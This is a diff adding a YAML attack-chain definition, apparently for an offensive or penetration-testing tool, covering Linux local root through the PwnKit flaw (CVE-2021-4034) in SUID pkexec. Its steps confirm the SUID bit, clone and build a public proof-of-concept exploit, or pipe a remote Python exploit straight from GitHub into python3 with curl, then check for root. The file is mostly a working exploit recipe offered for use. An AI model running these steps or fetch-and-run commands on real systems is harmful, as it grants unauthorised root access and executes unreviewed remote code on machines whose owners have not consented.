@@ -1,0 +1,41 @@
+chain_id: pwnkit_cve_2021_4034
+title: "Linux privesc — CVE-2021-4034 PwnKit (pkexec local root)"
+severity: CRITICAL
+tags: [linux, privesc, pwnkit, polkit, cve-2021-4034, kernel-cve]
+
+trigger:
+  any_of:
+    - { kind: "suid-binary", banner_pattern: "(?i)/pkexec$" }
+    - { kind: "suid-binary", banner_pattern: "(?i)/policykit-1/" }
+
+description: |
+  PwnKit (CVE-2021-4034) is a memory-corruption bug in `pkexec` that
+  has been a SUID binary by default since 2009. Any local user can
+  exploit it to spawn a root shell. Patched in polkit ≥ 0.120 — but
+  unpatched on every distro snapshot prior to early 2022.
+
+steps:
+  - id: 1
+    title: "Confirm the SUID bit is set on pkexec"
+    command: ls -l /usr/bin/pkexec
+
+  - id: 2
+    title: "Drop a known-good public PoC and run"
+    command: |
+      git clone https://github.com/berdav/CVE-2021-4034.git
+      cd CVE-2021-4034
+      make
+      ./cve-2021-4034
+
+  - id: 3
+    title: "Single-binary alternative"
+    command: |
+      curl -sL https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/cve-2021-4034.py | python3 -
+
+  - id: 4
+    title: "Verify root"
+    command: id
+
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2021-4034
+  - https://github.com/berdav/CVE-2021-4034
